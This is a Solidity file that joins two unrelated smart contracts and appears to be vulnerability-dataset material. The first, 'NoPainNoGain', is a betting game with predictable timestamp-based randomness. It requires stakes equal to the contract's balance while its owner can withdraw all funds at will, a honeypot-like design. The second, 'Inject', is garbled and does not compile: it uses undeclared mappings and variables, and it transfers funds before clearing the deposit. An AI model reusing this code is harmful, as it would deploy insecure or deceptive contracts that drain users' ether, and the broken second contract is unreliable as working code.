pragma solidity ^0.4.19;
contract NoPainNoGain {

    address private Owner = msg.sender;

    function NoPainNoGain() public payable {}
    function() public payable {}

    function Withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Play(uint n) public payable {
        if(rand(msg.sender) * n < rand(Owner) && msg.value >= this.balance && msg.value > 0.25 ether)
            // You have to risk as much as the contract do
            msg.sender.transfer(this.balance+msg.value);
    }

	function rand(address a) private view returns(uint) {
		return uint(keccak256(uint(a) + now));
	}
}
pragma solidity ^0.4.24;
contract Inject {
	uint depositAmount;
	constructor() public {owner = msg.sender;}
	function withdrawRequest() public {
 	require(tx.origin == msg.sender, );
 	uint blocksPast = block.number - depositBlock[msg.sender];
 	if (blocksPast <= 100) {
  		uint amountToWithdraw = depositAmount[msg.sender] * (100 + blocksPast) / 100;
  		if ((amountToWithdraw > 0) && (amountToWithdraw <= address(this).balance)) {
   			msg.sender.transfer(amountToWithdraw);
   			depositAmount[msg.sender] = 0;
			}
		}
	}
}
